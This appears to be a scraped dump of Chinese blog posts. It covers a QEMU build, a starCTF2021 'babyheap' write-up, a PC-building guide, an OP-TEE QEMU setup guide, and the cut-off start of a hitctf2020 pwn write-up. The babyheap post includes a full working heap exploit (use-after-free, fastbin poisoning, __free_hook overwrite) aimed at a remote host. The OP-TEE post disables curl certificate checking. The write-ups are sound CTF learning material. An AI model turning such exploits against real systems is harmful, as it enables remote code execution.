libtheora-dev libtool libvorbis-dev pkg-config texinfo zlib1g-dev unzip cmake yasm libx264-dev libmp3lame-dev libopus-dev libvorbis-dev libxcb1-dev libxcb-shm0-dev libxcb-xfixes0-dev pkg-config texinfo wget zlib1g-dev \ncd build-qemu/\n../qemu/configure --enable-debug\nmake -j4\n```","categories":["编译"]},{"title":"starCTF2021 babyheap","url":"/2021/01/17/starctf-babyheap/","content":"\n# 1 分析\n\n[babyheap](starctf-babyheap.zip)\n\n题目包含一个可执行程序和一个libc。\n\n程序提供了六个功能，在delete中free后未将指针置NULL，导致UAF。\n\n## tcache\n\nlibc版本是2.27，free后的chunk会被扔到tcache中。由于本题所用的libc做了改动，无法通过double free形成一个环状以达到任意地址写。\n\nadd一次，delete两次后，堆空间状态如下。可以看到tcachebins中只有一个free chunk，并且其bk的位置被写入了0x0000555555757010。就是这个标志导致无法free两次成一个环状，可通过edit将该处写成别的值，绕过检查。但是由于edit无法写到fd的位置，所以还是无法简单地用tcache double free的方法利用。\n\n```shell\ngef➤  heap bins\n──────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcfc40 ────────────────────────────────────────────\nTcachebins[idx=1, size=0x30] count=1  ←  Chunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE) \n───────────────────────────────────────────── Fastbins for arena 0x7ffff7dcfc40 ─────────────────────────────────────────────\nFastbins[idx=0, size=0x20] 0x00\nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\n────────────────────────────────────────── Unsorted Bin for arena '*0x7ffff7dcfc40' ──────────────────────────────────────────\n[+] Found 0 chunks in unsorted bin.\n─────────────────────────────────────────── Small Bins for arena '*0x7ffff7dcfc40' ───────────────────────────────────────────\n[+] Found 0 chunks in 0 small non-empty bins.\n─────────────────────────────────────────── Large Bins for arena '*0x7ffff7dcfc40' ───────────────────────────────────────────\n[+] Found 0 chunks in 0 large non-empty bins.\ngef➤  heap chunks\nChunk(addr=0x555555757010, size=0x250, flags=PREV_INUSE)\n    [0x0000555555757010     00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE)\n    [0x0000555555757260     00 00 00 00 00 00 00 00 10 70 75 55 55 55 00 00    .........puUUU..]\nChunk(addr=0x555555757290, size=0x20d80, flags=PREV_INUSE)  ←  top chunk\ngef➤  x/10gx 0x0000555555757260\n0x555555757260:\t0x0000000000000000\t0x0000555555757010\n0x555555757270:\t0x0000000000000000\t0x0000000000000000\n0x555555757280:\t0x0000000000000000\t0x0000000000020d81\n0x555555757290:\t0x0000000000000000\t0x0000000000000000\n0x5555557572a0:\t0x0000000000000000\t0x0000000000000000\n```\n\n## fastbin\n\ntcache中无法利用，那么把tcache的一条链填满，让free chunk进入fastbin中。\n\n题目源码里leaveyouname()函数中会申请一个0x400的超大chunk，申请超大chunk时会触发fastbin中的free chunk合并——跟top chunk挨着的会合并到top chunk中然后分配出去，不跟top chunk挨着的会合并起来放到unsortedbin或者smallbin中。\n\n进入unsortedbin或者smallbin中的堆块会有main_arena的地址信息，可以通过泄露这个地址进而泄露libc。\n\nadd 16个不同的index（从0到15），然后全部delete掉，得到如下bin状态。0~6在tcache中，7~15在fastbin中。此时申请大堆块，会将7~15全部合并到top chunk，然后分配给新的申请。这样将不会有chunk进入unsortedbin或者smallbin。所以需要在7~15中保持一个chunk不释放，将原本空间连续的chunk分成两部分。\n\n比如，将index为10的chunk不delete。这样在申请大堆块时，7~9会合并到smallbin中，11~15会合并到top chunk中然后分配给新的申请。\n\n```shell\ngef➤  heap bins\n───────────────────── Tcachebins for arena 0x7fd435ee1c40 ─────────────────────\nTcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x55e338453320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453280, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453260, size=0x20, flags=PREV_INUSE) \n────────────────────── Fastbins for arena 0x7fd435ee1c40 ──────────────────────\nFastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55e338453440, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453420, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453400, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384533e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384533c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384533a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453360, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453340, size=0x20, flags=PREV_INUSE) \nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\n─────────────────── Unsorted Bin for arena '*0x7fd435ee1c40' ───────────────────\n[+] Found 0 chunks in unsorted bin.\n──────────────────── Small Bins for arena '*0x7fd435ee1c40' ────────────────────\n[+] Found 0 chunks in 0 small non-empty bins.\n──────────────────── Large Bins for arena '*0x7fd435ee1c40' ────────────────────\n[+] Found 0 chunks in 0 large non-empty bins.\n```\n\n利用上述思路，泄露main_arena地址进而获得libc基址的代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\n# 第10个chunk不delete，保证合并时有fastbin能合并到unsortedbin或者smallbin中\nfor i in range(11,16,1):\n    delete(i)\n\ngdb.attach(myproc)\n\n# 触发堆合并\nname = 'aaaa'\nleaveyourname(name)\n\n# 泄露smallbin中的main_arena地址\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\n# 通过调试时看到的地址差，算出libc基址\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\nmyproc.interactive()\n```\n\n## UAF\n\n上述11~15 fastbin chunk跟top chunk合并后分配给了leaveyouname中的name=malloc(0x400)。\n\n此时name指向11~15，add函数中的pools[11]~pools[15]也指向该处（delete函数中free pools[]后未将其置NULL）。\n\n所以可以借助name的输入布置chunk，再通过pools[]数组操作。\n\n```python\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\ngdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(myproc.pid)).readlines()[1], 16)\nlog.warn(\"base is 0x%x\" % gdb_text_base)\nbss_addr = gdb_text_base + 0x202020\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n# gdb.attach(myproc)\n\ndelete(12)\ndelete(13)  # 执行完这两个delete后，fastbin中会出现一个0x60和一个0x30的free chunk。这两个chunk实际时重叠的，0x60的chunk包含0x30的chunk。所以后面通过改0x60这个chunk的内容可以改0x30这个chunk的fd\n\nadd(0,0x50)  # 会将fastbin上0x60那个chunk分配出来\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(bss_addr)\nedit(0,payload1)  # 将bss_addr写入0x30这个chunk的fd\nadd(1,0x20)  # 申请0x20大小的堆块，会将fastbin上0x30的chunk分配出来。由于上一步改了fd（bss_addr），所以下一次再申请同样大小的chunk时，会从bss_addr处开始分配\nadd(2,0x20)  # 这次add，分配的是bss_addr处。因此，后面对这个chunk的操作会复写bss段。通过更改payload1中的地址，可以实现任意地址写任意值\nedit(2,p64(0xdeadbeef))\n```\n\n执行完leaveyouname后的堆空间：\n\n```\ngef➤  heap chunks\nChunk(addr=0x55a8beee9010, size=0x250, flags=PREV_INUSE)\n    [0x000055a8beee9010     07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee9260, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9260     00 00 00 00 00 00 00 00 10 90 ee be a8 55 00 00    .............U..]\nChunk(addr=0x55a8beee9280, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9280     60 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    `....U.......U..]\nChunk(addr=0x55a8beee92a0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92a0     80 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92c0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92c0     a0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92e0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92e0     c0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9300, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9300     e0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9320, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9320     00 93 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9340, size=0x60, flags=PREV_INUSE)\n    [0x000055a8beee9340     f0 2c 2b 5c d4 7f 00 00 f0 2c 2b 5c d4 7f 00 00    .,+\\.....,+\\....]\nChunk(addr=0x55a8beee93a0, size=0x20, flags=)\n    [0x000055a8beee93a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee93c0, size=0x410, flags=PREV_INUSE)\n    [0x000055a8beee93c0     61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62    aaaaaaaabbbbbbbb]\nChunk(addr=0x55a8beee97d0, size=0x20840, flags=PREV_INUSE)  ←  top chunk\ngef➤  x/20gx 0x000055a8beee93c0\n0x55a8beee93c0:\t0x6161616161616161\t0x6262626262626262\t# pools[11]的内容\n0x55a8beee93d0:\t0x6363636363636363\t0x0000000000000061\t# pools[12]的size\n0x55a8beee93e0:\t0x0000000000000000\t0x0000000000000000  # pools[12]的内容\n0x55a8beee93f0:\t0x0000000000000000\t0x0000000000000031\t# pools[13]的size\n0x55a8beee9400:\t0x000055a8beee930a\t0x0000000000000000\t# pools[13]的size\n0x55a8beee9410:\t0x0000000000000000\t0x0000000000020bf1\n0x55a8beee9420:\t0x000055a8beee93f0\t0x0000000000000000\n0x55a8beee9430:\t0x0000000000000000\t0x0000000000020bd1\n0x55a8beee9440:\t0x000055a8beee9410\t0x0000000000000000\n0x55a8beee9450:\t0x0000000000000000\t0x0000000000020bb1\n```\n\n# EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = remote(\"52.152.231.198\",8081)\n# myproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\n# gdb.attach(myproc)\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\n\nfree_hook = mylibc.symbols['__free_hook'] + libc_base\nlog.warn(\"free hook 0x%x\" % free_hook)\n\n# exec_addr = 0xdeadbeef\nexec_addr = libc_base + 0x4f432\ndelete(12)\ndelete(13)\n\nadd(0,0x50)\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(free_hook - 0x8)\nedit(0,payload1)\nadd(1,0x20)\nadd(2,0x20)\nedit(2,p64(exec_addr))\nlog.warn(\"small bin : 0x%x\" % u64(small_bin_c.ljust(8,'\\x00')))\nlog.success(\"libc base : 0x%x\" % libc_base)\nlog.warn(\"free hook 0x%x\" % free_hook)\n\ndelete(9)\n\nmyproc.interactive()\n\n```","categories":["CTF"]},{"title":"从零开始组装台式机","url":"/2020/12/20/myfirstpc/","content":"\n> 现在的笔记本已经用了4年了，上半年加了一块8g的内存条，现在用着性能也还不错。但是最近想开始学习渗透和web，需要搭建各种虚拟机环境，有时需要同时跑5、6台虚拟机，笔记本确实受不住。所以，出于性价比和探索精神的考虑，决定尝试自己组装一台windows台式机。感觉有点酷酷的O(∩_∩)O\n\n在开始组装电脑之前，做了一点小功课，其实就是看知乎上别人推荐的各种组件。主要参考了如下两篇文章：\n\n- [买台式电脑 6000～7000是直接买品牌机 还是自己组装 性价比高?](https://www.zhihu.com/question/402052824/answer/1340237376)\n- [7000元intel十代酷睿i7 10700F电脑配置方案](https://zhuanlan.zhihu.com/p/315480353)\n\n后面这篇文章的作者还写了很多帖子，分别介绍了不同价位的组装机搭配。不一定要完全按照他们推荐的组件进行配置，但能提供一个相对完整的方案给我们这种小白做参考，真的是非常好的。\n\n想要组装一台主机，首先需要知道主机由哪些组件构成，我的理解如下：\n\n- 1、CPU：这是一台主机的核心，计算能力都靠它了。x86架构的有intel和amd两家厂商可选。\n- 2、主板：主板上的电路非常丰富，负责连接各个组件，非常重要。\n- 3、散热器：顾名思义用来散热的，这里指给cpu散热的散热器。\n- 4、内存条：主机的主要组成之一。\n- 5、硬盘：分为SSD和普通机械硬盘，前者速度快很多。\n- 6、显卡：若CPU不带集显，则必须在主板外接一个显卡，不然无法显示。CPU带集显的情况下也可以自己装个更好的显卡，玩游戏时会有更好的视觉体验。\n- 7、电源：电源分很多种，550W，600W，650W，750W等等，根据实际需要进行选择，我是按照参考文章配的电源。\n- 8、机箱：用来固定主板，将电源等装在一起，方便后续使用。\n- 9、外设：需要**鼠标**、**键盘**、**显示器**这些基本的输入输出设备，不然没法跟主机交互哦。\n\n# 第一步，买配件\n\n下面介绍一下我组装电脑的配置吧！不包括显卡、显示器、键盘鼠标这些，一共花了6k左右。这个价格和这个配置的性价比，作为电脑组装入门我觉得是很可以的。\n\n## 1、CPU\n\n[intel i7-10700F 8核16线程](https://item.jd.com/100013163656.html)\n\ni7的cpu不算新，但是也够用吧。这款有三种类型：\n\n- 10700：带集显的cpu\n- 10700F：不带集显的cpu\n- 10700FK：不带集显且可超频的cpu\n\n我对超频没需求，想自己配显卡，所以选了中间这个10700F型号。\n\n## 2、主板\n\n[微星（MSI）MAG B460M MORTAR WIFI迫击炮电脑主板](https://item.jd.com/100013654784.html)\n\n主板我留意了技嘉和微星两家的，两家都还不错。因为第一次配机器，怕后面装好后有兼容性等问题，就选了帖子推荐的微星这款。\n\n## 3、散热器\n\n[超频三（PCCOOLER）东海X6 CPU散热器](https://item.jd.com/3311611.html)\n\n散热器分为风冷和水冷两种。水冷是新产品，据说很酷炫很烧钱，所以我就选了保守派风冷。目前觉得也挺好用的。\n\n## 4、内存条\n\n[美商海盗船(USCORSAIR)DDR4 3000 32GB(16G×2)套装 台式机内存条 复仇者LPX系列 游戏型](https://item.jd.com/1990572.html#crumb-wrap)\n\n内存条可以根据自己实际需要来选，我觉得是越大越好。公司大部分电脑都是32g的，之前我的笔记本是16g，感觉32g对于目前大部分工作来说是完全够用了的。\n\n内存条的厂商有金士顿，海盗船等等。我选了海盗船16g*2的，为什么不直接买32g呢？因为主板有4个内存条插槽，据说1和3，2和4各自组合起来用效率是最高的，所以买两条充分发挥一下主板的作用。\n\n## 5、硬盘\n\n[西部数据（Western Digital）1TB SSD固态硬盘 M.2接口(NVMe协议) WD_BLACK SN750](https://item.jd.com/100002206075.html#crumb-wrap)\n\n硬盘有固态硬盘和机械硬盘之分，考虑速度问题，我买了一块1T的固态硬盘，没有买机械硬盘。如果后面固态硬盘不够用了再考虑从买机械硬盘。\n\n硬盘比较有名的厂商是西部数据，三星，东芝，联想等等，可以挑自己喜欢的。据说西部数据这个黑盘很好，所以我就买来试试。\n\n## 6、显卡\n\n[华硕 （ASUS）电竞特工TUF-GeForce RTX 2060-O6G-GAMING 14000MHz 1365-1740MHz游戏显卡6G](https://item.jd.com/100003292738.html)\n\n本来是想买上面这张显卡的，但是没抢到。今年好像显卡特别抢手？看了几篇帖子是这么说的，说不推荐现在买显卡。\n\n由于我买的CPU是不带集显的，所以暂时买了个几百块的便宜显卡过渡一下。\n\n## 7、电源\n\n[安钛克(Antec)VP550铜牌 台式机电脑主机机箱电源铜牌550W](https://item.jd.com/7254027.html)\n\n电源其实我也不太会选。如果CPU、显卡等组件性能越高功率很大的话，就需要买大功率的电源才能发挥它们的最高性能。我这个算是一般般的配置吧，就按照知乎帖子上推荐的买了550W的。\n\n## 8、机箱\n\n[先马（SAMA）坦克3 电脑主机箱 支持ATX主板](https://item.jd.com/100003124872.html)\n\n我买的这个机箱太大了。。。但是又懒得退货了，想着反正一直放在家里就随它吧。如果主板不是很大，也没有很多机械硬盘或固态硬盘需要空间的话，建议女孩子买个小机箱就可以了/(ㄒoㄒ)/~~\n\n## 9、外设\n\n外设就是键盘鼠标显示器这些，可以根据个人喜好去买，我就不推荐啦。\n\n# 第二步，组装\n\n说实话，当我把所有组件拆开后，准备开始组装的时候，我后悔了。为什么要给自己找这么大的麻烦/(ㄒoㄒ)/~~\n\n本来以为就像搭积木一样，拼一拼就可以了。\n\n最困难的部分是散热器的安装，幸好在bilibili上找到一个很详细的组装教程，真的是救命教程——[【装机教程】这可能是你能在网上找到最详细的装机教程](https://www.bilibili.com/video/BV1jE411e7hw?t=1605)。为了表示我的感谢，第一次在b站上贡献出了2个币，哈哈哈。\n\n装机完成后客厅已经被我折磨成这样了。\n\n![](messmess.jpg)\n\n# 第三步，装系统\n\n下面这个视频里讲的很清楚，我就不做重复工作了。 在另一台win10电脑上访问官网，下载官方工具制作U盘启动盘。\n\n[【装机教程】超详细WIN10系统安装教程，官方ISO直装与PE两种方法教程，UEFI+GUID分区与Legacy+MBR分区](https://www.bilibili.com/video/av77344372)\n\n# 第四步，装驱动\n\n这也是很重要的一步，主板、显卡、外设等为了发挥最好的作用，需要更新他们的驱动。方法就是访问对应的官网，找到型号，下载安装就可以了。具体可以参考下面这个视频。\n\n[【装机教程】驱动程序是什么东西？为什么要安装驱动程序？如何正确官方的安装纯净版驱动？](https://www.bilibili.com/video/av84597019?spm_id_from=333.788.b_636f6d6d656e74.7)","categories":["Others"]},{"title":"基于qemu的optee模拟环境搭建","url":"/2020/12/20/qemuv8-optee/","content":"\n很早之前，参考CSDN博主“漂流的猴子”的两篇博客[0.使用Qemu运行OP-TEE](https://icyshuai.blog.csdn.net/article/details/71499619)和[OP-TEE_3.6.0的qemu运行验证](https://icyshuai.blog.csdn.net/article/details/99855105)，尝试搭建过optee的模拟执行环境，但无论是在家里还是在公司里，都因为网络或其他莫名的原因而没有成功。\n\n这次，误打误撞看到了optee官方文档中的搭建方法——[Build and run](https://optee.readthedocs.io/en/latest/building/index.html)，抱着尝试的心态，竟然搭建成功了！所以做个记录。\n\n我用到的环境如下：\n\n- windows 10上安装的virtualbox 6.1.6版本。这个版本应该无所谓。\n\n- 虚拟机的系统是Ubuntu 18.04。\n- 安装的optee版本是3.8.0。\n\n这里要提两个点，一开始我用的是Ubuntu 16.04版本安装optee 3.6.0，但是在安装依赖的时候一直报下面这个错，所以我就换成了Ubuntu 18.04。\n\n```shell\nE: Unable to locate package python3-pycryptodome\n```\n\n在Ubuntu 18.04上repo init的时候又报了一个错（具体是啥忘记了），原因是repo版本和optee版本不兼容。要么降低repo的版本（从2.x到1.x），要么使用新版本的optee。我选择了后者，使用Ubuntu 18.04，repo 2.x版本安装optee的3.8.0版本，最终环境搭建成功。\n\n# 1 安装依赖\n\n（1）因为安装的是64位的ubuntu，所以先使能系统对i386的支持。\n\n```shell\n$ sudo dpkg --add-architecture i386\n$ sudo apt-get update\n```\n\n（2）安装所有需要用到的packages。\n\n```shell\n$ sudo apt-get install android-tools-adb android-tools-fastboot autoconf \\\n        automake bc bison build-essential ccache cscope curl device-tree-compiler \\\n        expect flex ftp-upload gdisk iasl libattr1-dev libcap-dev \\\n        libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \\\n        libpixman-1-dev libssl-dev libtool make \\\n        mtools netcat python-crypto python3-crypto python-pyelftools \\\n        python3-pycryptodome python3-pyelftools python-serial python3-serial \\\n        rsync unzip uuid-dev xdg-utils xterm xz-utils zlib1g-dev\n```\n\n# 2 安装android repo\n\n如果系统之前没有android的开发环境，没有安装过repo的话，可以将repo下载到本地，然后添加到环境变量中。\n\n```shell\n$ mkdir ~/bin\n$ vim ~/.bashrc\n\texport PATH=~/bin:$PATH\n$ source ~/.bashrc\n$ curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo\n$ chmod a+x ~/bin/repo\n```\n\n# 3 获取源码\n\n通过github上op-tee项目中的manifest指定版本来获取所需的源码，这种方法对于新手来说快捷省事。（repo之前需要设置好git的代理，保证能通过git访问外网）\n\n```shell\n$ mkdir -p optee\n$ cd optee\n$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml -b 3.8.0\n$ repo sync -j4 --no-clone-bundle\n```\n\n以上命令执行完如果没有任何问题的话，就可以直接跳到第4步去下载toolchain了。\n\n但是很不幸，我在`sync`的时候遇到了这个错误——`“GnuTLS recv error (-110): The TLS connection was non-properly terminated”`，最后成功的[解决办法](https://stackoverflow.com/questions/52529639/gnutls-recv-error-110-the-tls-connection-was-non-properly-terminated)是重装git，步骤如下。\n\n```shell\n$ sudo apt-get install build-essential fakeroot dpkg-dev -y\n$ sudo apt-get build-dep git -y\n$ sudo apt-get install libcurl4-openssl-dev -y\n$ cd ~\n$ mkdir source-git\n$ cd source-git/\n$ apt-get source git\n$ cd git-2.*.*/\n$ sed -i -- 's/libcurl4-gnutls-dev/libcurl4-openssl-dev/' ./debian/control\n$ sed -i -- '/TEST\\s*=\\s*test/d' ./debian/rules\n$ dpkg-buildpackage -rfakeroot -b -uc -us\n$ sudo dpkg -i ../git_*ubuntu*.deb\n```\n\n# 4 下载toolchains\n\n编译不同架构的op-tee时，需要用到不同的toolchain，因此我们需要事先下载好。\n\n```shell\n$ cd ~/optee/build\n$ make -j2 toolchains\n```\n\n如果以上命令执行没有问题的话，继续去第5步就好啦。\n\n我这里遇到一个问题：\n\n- make报错，提示在指定的目录中没有tar包。\n\n  我仔细研究了一下，发现是没有下载下来。于是打开build目录下的toolchain.mk看了看这个脚本的实现。脚本第25行是`curl -s -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`，目的是下载一个tar包。去掉`-s`看看下载时到底发生了什么。果不其然，有错误提示`curl: (60) SSL certificate problem: unable to get local issuer certificate`。这是证书的问题，有两种方案：一种是在本地安装证书，另一种是curl下载时加上`-k`参数跳过证书检查。我选择第二种，因此将toolchain.mk中的第25行改成`curl -k -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`，然后就可以成功下载toolchain啦。\n\n# 5 编译整个工程\n\n因为在一开始已经设置过repo manifests了，所以编译的时候可以不指定版本，直接运行make。\n\n```shell\n$ cd ~/optee/build\n$ make -j4\n# 或者，将编译输出重定向到log中，方便编译出问题了定位\n$ make 2>&1 | tee build.log\n```\n\n# 6 运行optee\n\n在build目录下执行make run\n\n```shell\n$ cd ~/optee/build\n$ make run\n```\n\n执行完后，一共会有三个窗口：qemu，非安全世界，安全世界。前两个窗口有shell，安全世界的窗口只有日志输出。\n\n在qemu窗口中执行`c`，然后就可以在非安全世界的shell中执行`xtest`进行测试。\n\n```\nQEMU console:         (qemu) c\nNormal world shell:   # xtest\n```\n\n到此，整个基于qemu的optee环境就算搭建完成了，后续可以自由地进行分析和验证。\n\n# 7 optee代码目录结构\n\n一开始不明白为什么manifest下的default.xml和qemu_v8.xml两者代码目录不一样，最明显的，前者有uboot而后者没有，那后者是用什么引导启动的呢？\n\n其实，default.xml编译的是32位的optee，而qemu_v8.xml编译的是64位的。64位的optee使用UEFI-EDK2替换掉了uboot，并引入加密组件mbedtls。这里参考了[OPEN-TEE代码目录结构及编译目标](https://www.xiezeyang.com/2020/08/16/Security/OPEN-TEE%E4%BB%A3%E7%A0%81%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8F%8A%E7%BC%96%E8%AF%91%E7%9B%AE%E6%A0%87/)这篇文章才弄懂的。\n\n以qemu_v8.xml中的代码目录为例，如下是编译完成后的状态，out和out-br是编译过程中创建的目录。\n\n```\nbuild/ - 不同平台的makefile及kconfig\nbuildroot/ - 一款编译工具\nedk2/ - 遵循UEFI标准的bootloader源码\nlinux/ - linux kernel源码\nmbedtls/ - 开源的ssl/tls加密组件，轻量级\noptee_benchmark/ - open-tee项目基准框架的源码\noptee_client/ - open-tee项目的非安全侧源码\noptee_examples/ - open-tee中使用的示例CA和TA源码\noptee_os/ - open-tee项目的os源码\noptee_test/ - 测试套件xtest源码\nout/ - 存储编译生成用于烧录的image，如bl1.bin, bl2.bin等\nout-br/ - 存放buildroot工具编译生成的文件\nqemu/ - qemu源码\n.repo/ - repo工程\nsoc_term/ - 监听qemu、非安全终端、安全终端三个端口，正确将log重定向至对应的终端\ntoolchains/ - 包含编译所需的工具链\ntrusted-firmware-a/ - atf源码\n```\n\n# 8 后续研究\n\n后面计划参考《手机安全和可信应用开发指南》及[OP-TEE documentation](https://optee.readthedocs.io/en/latest/general/index.html)对各个模块更深入地分析。\n\n另一个任务是分析一些[op-tee历年漏洞](https://www.op-tee.org/security-advisories/)。","categories":["OP-TEE"]},{"title":"hitctf2020之dagongren1","url":"/2020/12/05/hitctf2020-dagongren1/","content":"\n> 这是第一次在比赛的时候把题目给做出来了嘻嘻嘻。感谢王老师，为了让我把这题做完还请我吃烧烤，此处必须给王老师发一张超级Super无敌好人卡！[狗头...]\n\n# 1 漏洞点\n\n题目下载：[dagongren1](dagongren1)\n\n首先看一下程序的基本情况。\n\n```shell\nbling@bling:~/Desktop$ file dagongren1 \ndagongren1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e5adcd14da3eedce7b1b4c36d62d68bd687e63bc, not stripped\nbling@bling:~/Desktop$ checksec dagongren1 \n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\n\nx86架构下的64位程序，栈cookie、NX、PIE都没开，还有可读可写可执行的段，看起来这个题利用时没什么障碍。运行一下程序，然后看看IDA反汇编的源码，分析一下漏洞点。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4[32]; // [rsp+0h] [rbp-20h] BYREF\n\n  puts(\"Good morning master\");\n  puts(aWorkHardForYou);\n  puts(\"Come On\");\n  _isoc99_scanf(\"%s\", v4);\n  